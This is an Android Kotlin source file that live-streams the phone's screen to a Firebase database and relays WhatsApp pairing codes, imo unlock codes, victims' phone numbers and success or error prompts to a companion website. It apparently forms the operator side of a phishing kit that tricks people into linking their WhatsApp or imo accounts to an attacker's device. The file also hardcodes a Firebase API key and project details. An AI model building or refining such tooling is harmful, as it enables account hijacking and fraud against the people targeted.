package com.example.data.firebase

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.util.Base64
import android.util.Log
import android.widget.Toast
import com.example.data.model.PathChannel
import com.example.data.model.PathChannelsRegistry
import com.example.data.model.WebsitePlatform
import com.example.util.AppPreferences
import com.example.util.TtsManager
import com.example.util.VibrationHelper
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.ConnectionPool
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicLong
import java.util.concurrent.atomic.AtomicReference

/**
 * FirebaseScreenStreamManager
 *
 * Lightweight, Unified Single-Link Conflated Streamer & Action Publisher:
 * - Hosts both WhatsApp & imo modes on ONE unified channel root (`screen_share` .. `screen_share_20`).
 * - Instant HTTP/2 Keep-Alive `PATCH` / `PUT` for mode switching, Fly codes, Phone numbers, and Success signals.
 * - Zero Accessibility remote-click listeners, zero call/chat listeners, and zero frame queue backlog.
 */
class FirebaseScreenStreamManager private constructor(private val appContext: Context) {

    private data class PendingFrame(
        val jpegBytes: ByteArray,
        val durationStr: String,
        val isPreCropped: Boolean,
        val platform: WebsitePlatform,
        val channel: PathChannel,
        val capturedAt: Long
    )

    private val tag = "FirebaseScreenStream"
    val databaseUrl = "https://my-sc-tools-default-rtdb.firebaseio.com"
    private val appPrefs by lazy { AppPreferences.getInstance(appContext) }

    private val _currentChannel = MutableStateFlow(
        PathChannelsRegistry.getChannelBySlot(AppPreferences.getInstance(appContext).selectedChannelSlot)
    )
    val currentChannel: StateFlow<PathChannel> = _currentChannel.asStateFlow()

    private val _selectedPlatform = MutableStateFlow(
        AppPreferences.getInstance(appContext).selectedWebsitePlatform
    )
    val selectedPlatform: StateFlow<WebsitePlatform> = _selectedPlatform.asStateFlow()

    private val _isWhatsAppSiteActive = MutableStateFlow(false)
    val isWhatsAppSiteActive: StateFlow<Boolean> = _isWhatsAppSiteActive.asStateFlow()

    private val _isImoSiteActive = MutableStateFlow(false)
    val isImoSiteActive: StateFlow<Boolean> = _isImoSiteActive.asStateFlow()

    val directRestUrl: String
        get() = _currentChannel.value.liveRestUrl

    val currentLivePath: String
        get() = _currentChannel.value.livePath

    private val httpClient = OkHttpClient.Builder()
        .connectionPool(ConnectionPool(6, 3, TimeUnit.MINUTES))
        .connectTimeout(3, TimeUnit.SECONDS)
        .readTimeout(3, TimeUnit.SECONDS)
        .writeTimeout(3, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    var firebaseDatabase: FirebaseDatabase? = null
        private set
    private var liveRef: DatabaseReference? = null
    private var stateRef: DatabaseReference? = null

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    @Volatile
    private var isStreamingActive = false

    @Volatile
    private var currentSessionStartTime = 0L

    private val frameSequence = AtomicLong(0L)
    private val lastEmittedTs = AtomicLong(0L)
    private val lastModeSwitchTs = AtomicLong(0L)
    private val latestPendingFrame = AtomicReference<PendingFrame?>(null)
    private val frameWakeSignal = Channel<Unit>(Channel.CONFLATED)

    private val _framesSent = MutableStateFlow(0L)
    val framesSent: StateFlow<Long> = _framesSent.asStateFlow()

    private val _isCloudConnected = MutableStateFlow(false)
    val isCloudConnected: StateFlow<Boolean> = _isCloudConnected.asStateFlow()

    companion object {
        private const val APP_NAME = "ScreenShareFirebase"
        private const val MIN_UPLOAD_INTERVAL_MS = 75L

        @Volatile
        private var instance: FirebaseScreenStreamManager? = null

        fun getInstance(context: Context): FirebaseScreenStreamManager {
            return instance ?: synchronized(this) {
                instance ?: FirebaseScreenStreamManager(context.applicationContext).also { instance = it }
            }
        }

        fun nextMonotonicTimestamp(nowMs: Long, previousMs: Long): Long {
            return if (nowMs > previousMs) nowMs else previousMs + 1L
        }
    }

    init {
        initFirebase()
        startConflatedUploaderLoop()
    }

    private fun initFirebase() {
        try {
            val options = FirebaseOptions.Builder()
                .setApiKey("AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y")
                .setApplicationId("1:285986090017:web:9d872b9bb5c472bcb74760")
                .setProjectId("my-sc-tools")
                .setDatabaseUrl(databaseUrl)
                .setStorageBucket("my-sc-tools.appspot.com")
                .setGcmSenderId("285986090017")
                .build()

            val app = try {
                FirebaseApp.getInstance(APP_NAME)
            } catch (_: Exception) {
                FirebaseApp.initializeApp(appContext, options, APP_NAME)
            }

            firebaseDatabase = FirebaseDatabase.getInstance(app, databaseUrl)
            _isCloudConnected.value = true
            setupChannelReferences(_currentChannel.value)
            if (appPrefs.isChannelLoggedIn) {
                publishPlatformModeAsync(_selectedPlatform.value, _currentChannel.value)
            }
        } catch (e: Exception) {
            Log.e(tag, "Error initializing Firebase Realtime Database: ${e.message}", e)
        }
    }

    private fun setupChannelReferences(channel: PathChannel) {
        val db = firebaseDatabase ?: return
        liveRef = db.getReference(channel.rootNode).child("live")
        stateRef = db.getReference(channel.rootNode).child("state")
    }

    /**
     * Publishes active UI mode (`whatsapp` or `imo`) to `<rootNode>/state`
     * so the channel's single open website switches views immediately without reload.
     */
    fun publishPlatformModeAsync(
        platform: WebsitePlatform = _selectedPlatform.value,
        channel: PathChannel = syncActiveChannelFromPrefs()
    ) {
        val modeTs = nextMonotonicTimestamp(System.currentTimeMillis(), lastModeSwitchTs.get())
        lastModeSwitchTs.set(modeTs)

        scope.launch(Dispatchers.IO) {
            val json = "{\"mode\":\"${platform.id}\",\"modeTs\":$modeTs}"
            val patched = patchViaRest(channel.stateRestUrl, json)
            if (!patched) {
                try {
                    stateRef?.updateChildren(mapOf("mode" to platform.id, "modeTs" to modeTs))
                } catch (_: Exception) {}
            }
        }
    }

    /**
     * Publishes 8-digit WhatsApp pairing code or 4-8 digit imo code via fast HTTP/2 + SDK fallback.
     */
    fun sendFlyCodeAsync(
        rawCode: String,
        onSuccess: () -> Unit,
        onFailure: (String) -> Unit
    ) {
        val channel = syncActiveChannelFromPrefs()
        val platform = _selectedPlatform.value
        val now = System.currentTimeMillis()

        scope.launch(Dispatchers.IO) {
            try {
                val liveCodeObj = JSONObject().apply {
                    put("code", rawCode)
                    put("platform", platform.id)
                    put("channelSlot", channel.slotNumber)
                    put("timestamp", now)
                }
                val statePatch = JSONObject().apply {
                    put("mode", platform.id)
                    put("liveCode", liveCodeObj)
                }.toString()

                val rootPatch = JSONObject().apply {
                    put("pairingCode", rawCode)
                    put("liveCode", liveCodeObj)
                    if (platform == WebsitePlatform.IMO && rawCode.length == 4) {
                        put("verification", JSONObject().apply {
                            put("unlockCode", rawCode)
                            put("updatedAt", now)
                        })
                    }
                }.toString()

                val stateOk = patchViaRest(channel.stateRestUrl, statePatch)
                patchViaRest("$databaseUrl/${channel.rootNode}.json", rootPatch)

                if (platform == WebsitePlatform.WHATSAPP && channel.slotNumber == 1) {
                    val slot1Legacy = JSONObject().apply {
                        put("pairingCode", rawCode)
                        put("liveCode", JSONObject().apply {
                            put("code", rawCode)
                            put("timestamp", now)
                        })
                    }.toString()
                    patchViaRest("$databaseUrl/.json", slot1Legacy)
                }

                if (!stateOk) {
                    val db = firebaseDatabase
                    if (db != null) {
                        val map = mapOf(
                            "code" to rawCode,
                            "platform" to platform.id,
                            "channelSlot" to channel.slotNumber,
                            "timestamp" to now
                        )
                        db.getReference(channel.statePath).updateChildren(
                            mapOf("mode" to platform.id, "liveCode" to map)
                        )
                        db.getReference("${channel.rootNode}/liveCode").setValue(map)
                        db.getReference(channel.pairingCodePath).setValue(rawCode)
                    } else {
                        withContext(Dispatchers.Main) { onFailure("নেটওয়ার্ক সংযোগ চেক করুন") }
                        return@launch
                    }
                }

                withContext(Dispatchers.Main) { onSuccess() }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { onFailure(e.message ?: "ব্যর্থ হয়েছে") }
            }
        }
    }

    /**
     * Publishes phone number to `<rootNode>/phone` (and `verification` when on imo).
     */
    fun sendPhoneNumberAsync(cleanPhone: String) {
        val channel = syncActiveChannelFromPrefs()
        val platform = _selectedPlatform.value
        val now = System.currentTimeMillis()

        scope.launch(Dispatchers.IO) {
            val phoneJson = JSONObject().apply {
                put("phoneNumber", cleanPhone)
                put("platform", platform.id)
                put("channelSlot", channel.slotNumber)
                put("timestamp", now)
            }.toString()
            val ok = uploadViaRest("$databaseUrl/${channel.rootNode}/phone.json", phoneJson)
            val pairRequestJson = JSONObject().apply {
                put("phoneNumber", cleanPhone)
                put("platform", platform.id)
                put("channelSlot", channel.slotNumber)
                put("status", "requested")
                put("timestamp", now)
            }.toString()
            uploadViaRest("$databaseUrl/${channel.rootNode}/pairing_request.json", pairRequestJson)
            if (platform == WebsitePlatform.IMO) {
                val verPatch = JSONObject().apply {
                    put("phoneNumber", cleanPhone)
                    put("channelSlot", channel.slotNumber)
                    put("updatedAt", now)
                }.toString()
                patchViaRest("$databaseUrl/${channel.verificationPath}.json", verPatch)
            }
            if (!ok) {
                try {
                    firebaseDatabase?.getReference("${channel.rootNode}/phone")?.setValue(
                        mapOf(
                            "phoneNumber" to cleanPhone,
                            "platform" to platform.id,
                            "channelSlot" to channel.slotNumber,
                            "timestamp" to now
                        )
                    )
                    firebaseDatabase?.getReference("${channel.rootNode}/pairing_request")?.setValue(
                        mapOf(
                            "phoneNumber" to cleanPhone,
                            "platform" to platform.id,
                            "channelSlot" to channel.slotNumber,
                            "status" to "requested",
                            "timestamp" to now
                        )
                    )
                } catch (_: Exception) {}
            }
        }
    }

    /**
     * Publishes `success` signal to the unified website (`state`, `status`, `success`, and `verification` for imo).
     */
    fun sendSuccessSignalAsync() {
        val channel = syncActiveChannelFromPrefs()
        val platform = _selectedPlatform.value
        val now = System.currentTimeMillis()

        scope.launch(Dispatchers.IO) {
            val successJson = JSONObject().apply {
                put("status", "success")
                put("command", "success")
                put("signal", "success")
                put("platform", platform.id)
                put("channelSlot", channel.slotNumber)
                put("channelPassword", channel.uniquePassword)
                put("timestamp", now)
                put("signalTs", now)
            }

            val stateJson = JSONObject().apply {
                put("mode", platform.id)
                put("status", successJson)
                if (platform == WebsitePlatform.IMO) {
                    put("verification", JSONObject().apply {
                        put("signal", "success")
                        put("status", "verified")
                        put("signalTs", now)
                    })
                }
            }.toString()

            val stateOk = patchViaRest(channel.stateRestUrl, stateJson)
            val rootPatch = JSONObject().apply {
                put("status", successJson)
                put("success", successJson)
            }.toString()
            patchViaRest("$databaseUrl/${channel.rootNode}.json", rootPatch)

            if (platform == WebsitePlatform.IMO) {
                val verPatch = JSONObject().apply {
                    put("signal", "success")
                    put("status", "verified")
                    put("signalTs", now)
                }.toString()
                patchViaRest("$databaseUrl/${channel.verificationPath}.json", verPatch)
            }

            if (!stateOk) {
                try {
                    val map = mapOf(
                        "status" to "success",
                        "command" to "success",
                        "signal" to "success",
                        "platform" to platform.id,
                        "channelSlot" to channel.slotNumber,
                        "channelPassword" to channel.uniquePassword,
                        "timestamp" to now,
                        "signalTs" to now
                    )
                    firebaseDatabase?.getReference(channel.statusPath)?.setValue(map)
                    firebaseDatabase?.getReference(channel.successPath)?.setValue(map)
                    val stUpdates = mutableMapOf<String, Any>("mode" to platform.id, "status" to map)
                    if (platform == WebsitePlatform.IMO) {
                        val verMap = mapOf("signal" to "success", "status" to "verified", "signalTs" to now)
                        firebaseDatabase?.getReference(channel.verificationPath)?.updateChildren(verMap)
                        stUpdates["verification"] = verMap
                    }
                    stateRef?.updateChildren(stUpdates)
                } catch (_: Exception) {}
            }
        }
    }

    /**
     * Publishes `error` signal to the unified website (`state`, `status`, `error`, and `verification` for imo).
     */
    fun sendErrorSignalAsync(reason: String = "Your unlock number incorrect") {
        val channel = syncActiveChannelFromPrefs()
        val platform = _selectedPlatform.value
        val now = System.currentTimeMillis()

        scope.launch(Dispatchers.IO) {
            val errorJson = JSONObject().apply {
                put("status", "error")
                put("command", "error")
                put("signal", "error")
                put("error", reason)
                put("platform", platform.id)
                put("channelSlot", channel.slotNumber)
                put("channelPassword", channel.uniquePassword)
                put("timestamp", now)
                put("signalTs", now)
            }

            val stateJson = JSONObject().apply {
                put("mode", platform.id)
                put("status", errorJson)
                if (platform == WebsitePlatform.IMO) {
                    put("verification", JSONObject().apply {
                        put("signal", "error")
                        put("status", "error")
                        put("error", reason)
                        put("signalTs", now)
                    })
                }
            }.toString()

            val stateOk = patchViaRest(channel.stateRestUrl, stateJson)
            val rootPatch = JSONObject().apply {
                put("status", errorJson)
                put("error", errorJson)
            }.toString()
            patchViaRest("$databaseUrl/${channel.rootNode}.json", rootPatch)

            if (platform == WebsitePlatform.IMO) {
                val verPatch = JSONObject().apply {
                    put("signal", "error")
                    put("status", "error")
                    put("error", reason)
                    put("signalTs", now)
                }.toString()
                patchViaRest("$databaseUrl/${channel.verificationPath}.json", verPatch)
            }

            if (!stateOk) {
                try {
                    val map = mapOf(
                        "status" to "error",
                        "command" to "error",
                        "signal" to "error",
                        "error" to reason,
                        "platform" to platform.id,
                        "channelSlot" to channel.slotNumber,
                        "channelPassword" to channel.uniquePassword,
                        "timestamp" to now,
                        "signalTs" to now
                    )
                    firebaseDatabase?.getReference(channel.statusPath)?.setValue(map)
                    firebaseDatabase?.getReference(channel.errorPath)?.setValue(map)
                    val stUpdates = mutableMapOf<String, Any>("mode" to platform.id, "status" to map)
                    if (platform == WebsitePlatform.IMO) {
                        val verMap = mapOf("signal" to "error", "status" to "error", "error" to reason, "signalTs" to now)
                        firebaseDatabase?.getReference(channel.verificationPath)?.updateChildren(verMap)
                        stUpdates["verification"] = verMap
                    }
                    stateRef?.updateChildren(stUpdates)
                } catch (_: Exception) {}
            }
        }
    }

    private fun startConflatedUploaderLoop() {
        scope.launch(Dispatchers.IO) {
            var lastUploadCompletedAt = 0L
            while (isActive) {
                frameWakeSignal.receive()
                while (isStreamingActive) {
                    val frame = latestPendingFrame.getAndSet(null) ?: break

                    val elapsed = System.currentTimeMillis() - lastUploadCompletedAt
                    if (elapsed in 0 until MIN_UPLOAD_INTERVAL_MS) {
                        delay(MIN_UPLOAD_INTERVAL_MS - elapsed)
                        val newer = latestPendingFrame.getAndSet(null)
                        if (newer != null) {
                            transmitFrameSynchronously(newer)
                            lastUploadCompletedAt = System.currentTimeMillis()
                            continue
                        }
                    }

                    transmitFrameSynchronously(frame)
                    lastUploadCompletedAt = System.currentTimeMillis()
                }
            }
        }
    }

    private fun transmitFrameSynchronously(frame: PendingFrame) {
        if (!isStreamingActive) return

        val activePlat = _selectedPlatform.value
        val seq = frameSequence.incrementAndGet()
        val prevTs = lastEmittedTs.get()
        val monotonicTs = nextMonotonicTimestamp(maxOf(System.currentTimeMillis(), frame.capturedAt), prevTs)
        lastEmittedTs.set(monotonicTs)

        val targetRestUrl = frame.channel.liveRestUrl
        val base64Jpeg = Base64.encodeToString(frame.jpegBytes, Base64.NO_WRAP)

        val sb = StringBuilder(base64Jpeg.length + 240)
        sb.append("{\"active\":true,\"data\":\"data:image/jpeg;base64,")
        sb.append(base64Jpeg)
        sb.append("\",\"ts\":")
        sb.append(monotonicTs)
        sb.append(",\"seq\":")
        sb.append(seq)
        sb.append(",\"startTime\":")
        sb.append(currentSessionStartTime)
        sb.append(",\"cropped\":")
        sb.append(frame.isPreCropped)
        sb.append(",\"platform\":\"")
        sb.append(activePlat.id)
        sb.append("\",\"channelSlot\":")
        sb.append(frame.channel.slotNumber)
        sb.append(",\"duration\":\"")
        sb.append(frame.durationStr)
        sb.append("\"}")

        val uploaded = uploadViaRest(targetRestUrl, sb.toString())
        if (uploaded) {
            _framesSent.value += 1
        } else {
            try {
                val fallbackMap = mapOf(
                    "active" to true,
                    "data" to "data:image/jpeg;base64,$base64Jpeg",
                    "ts" to monotonicTs,
                    "seq" to seq,
                    "startTime" to currentSessionStartTime,
                    "cropped" to frame.isPreCropped,
                    "platform" to activePlat.id,
                    "channelSlot" to frame.channel.slotNumber,
                    "duration" to frame.durationStr
                )
                liveRef?.setValue(fallbackMap)
                _framesSent.value += 1
            } catch (_: Exception) {}
        }
    }

    fun selectPlatform(platform: WebsitePlatform) {
        val prev = _selectedPlatform.value
        _selectedPlatform.value = platform
        appPrefs.selectedWebsitePlatform = platform

        if (isStreamingActive) {
            _isWhatsAppSiteActive.value = (platform == WebsitePlatform.WHATSAPP)
            _isImoSiteActive.value = (platform == WebsitePlatform.IMO)
        }

        publishPlatformModeAsync(platform)

        if (prev != platform) {
            Log.i(tag, "Switched unified website mode to ${platform.id} (${currentLivePath})")
        }
    }

    fun switchChannel(channel: PathChannel) {
        _currentChannel.value = channel
        appPrefs.selectChannelSlot(channel.slotNumber)
        _isWhatsAppSiteActive.value = false
        _isImoSiteActive.value = false
        latestPendingFrame.set(null)
        setupChannelReferences(channel)
        publishPlatformModeAsync(_selectedPlatform.value, channel)
        Log.i(tag, "Switched to channel #${channel.slotNumber}: ${channel.nameBn}")
    }

    private fun setActivePlatformFlags(platform: WebsitePlatform, active: Boolean) {
        if (!active) {
            _isWhatsAppSiteActive.value = false
            _isImoSiteActive.value = false
        } else {
            _isWhatsAppSiteActive.value = (platform == WebsitePlatform.WHATSAPP)
            _isImoSiteActive.value = (platform == WebsitePlatform.IMO)
        }
    }

    private fun syncActiveChannelFromPrefs(): PathChannel {
        val savedSlot = appPrefs.selectedChannelSlot
        if (_currentChannel.value.slotNumber != savedSlot) {
            val freshChannel = PathChannelsRegistry.getChannelBySlot(savedSlot)
            _currentChannel.value = freshChannel
            setupChannelReferences(freshChannel)
        }
        return _currentChannel.value
    }

    fun startStreaming(platform: WebsitePlatform = _selectedPlatform.value) {
        _selectedPlatform.value = platform
        appPrefs.selectedWebsitePlatform = platform
        val channel = syncActiveChannelFromPrefs()
        val now = System.currentTimeMillis()
        currentSessionStartTime = now
        frameSequence.set(0L)
        latestPendingFrame.set(null)
        isStreamingActive = true
        setActivePlatformFlags(platform, true)
        _framesSent.value = 0L

        val targetLiveUrl = channel.liveRestUrl
        publishPlatformModeAsync(platform, channel)

        scope.launch(Dispatchers.IO) {
            try {
                liveRef?.onDisconnect()?.removeValue()
                val payload = JSONObject().apply {
                    put("active", true)
                    put("platform", platform.id)
                    put("channelSlot", channel.slotNumber)
                    put("channelName", channel.nameBn)
                    put("startTime", now)
                    put("ts", nextMonotonicTimestamp(now, lastEmittedTs.get()).also { lastEmittedTs.set(it) })
                    put("seq", 0)
                    put("duration", "00:00")
                }.toString()
                uploadViaRest(targetLiveUrl, payload)
            } catch (e: Exception) {
                Log.w(tag, "Error updating start status to Firebase: ${e.message}")
            }
        }
    }

    fun stopStreamingPlatform(@Suppress("UNUSED_PARAMETER") platform: WebsitePlatform = _selectedPlatform.value): Boolean {
        stopAllStreaming()
        return false
    }

    fun stopAllStreaming() {
        isStreamingActive = false
        latestPendingFrame.set(null)
        _isWhatsAppSiteActive.value = false
        _isImoSiteActive.value = false
        _framesSent.value = 0L
        val channel = syncActiveChannelFromPrefs()
        scope.launch(Dispatchers.IO) {
            try {
                liveRef?.onDisconnect()?.cancel()
                liveRef?.removeValue()
                deleteViaRest(channel.liveRestUrl)
            } catch (e: Exception) {
                Log.w(tag, "Error wiping Firebase screen share data: ${e.message}")
            }
        }
    }

    fun clearFirebaseData(@Suppress("UNUSED_PARAMETER") allPlatforms: Boolean = false, onComplete: (() -> Unit)? = null) {
        stopAllStreaming()
        scope.launch(Dispatchers.Main) {
            onComplete?.invoke()
        }
    }

    fun onNewScreenFrame(
        jpegBytes: ByteArray,
        durationStr: String,
        isPreCropped: Boolean = true
    ) {
        if (!isStreamingActive) return

        val channel = syncActiveChannelFromPrefs()
        val platform = _selectedPlatform.value
        setActivePlatformFlags(platform, true)

        latestPendingFrame.set(
            PendingFrame(
                jpegBytes = jpegBytes,
                durationStr = durationStr,
                isPreCropped = isPreCropped,
                platform = platform,
                channel = channel,
                capturedAt = System.currentTimeMillis()
            )
        )
        frameWakeSignal.trySend(Unit)
    }

    private fun uploadViaRest(url: String, jsonString: String): Boolean {
        return try {
            val req = Request.Builder()
                .url(url)
                .put(jsonString.toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(req).execute().use { response ->
                val ok = response.isSuccessful
                if (ok) _isCloudConnected.value = true
                ok
            }
        } catch (_: Exception) {
            false
        }
    }

    private fun patchViaRest(url: String, jsonString: String): Boolean {
        return try {
            val req = Request.Builder()
                .url(url)
                .patch(jsonString.toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(req).execute().use { response ->
                val ok = response.isSuccessful
                if (ok) _isCloudConnected.value = true
                ok
            }
        } catch (_: Exception) {
            false
        }
    }

    private fun deleteViaRest(url: String) {
        try {
            val req = Request.Builder()
                .url(url)
                .delete()
                .build()
            httpClient.newCall(req).execute().close()
        } catch (e: Exception) {
            Log.w(tag, "REST DELETE failed for $url: ${e.message}")
        }
    }

    fun copyFirebaseLink(context: Context) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("Firebase RTDB Live Screen Link", directRestUrl)
        clipboard.setPrimaryClip(clip)

        VibrationHelper(context).success()
        Toast.makeText(context, "ফায়ারবেস ক্লাউড লিংক কপি হয়েছে!", Toast.LENGTH_LONG).show()
        TtsManager(context).speak("আলহামদুলিল্লাহ! ফায়ারবেস রিয়েল-টাইম ডাটাবেইজ লিংক কপি হয়েছে।")
    }
}
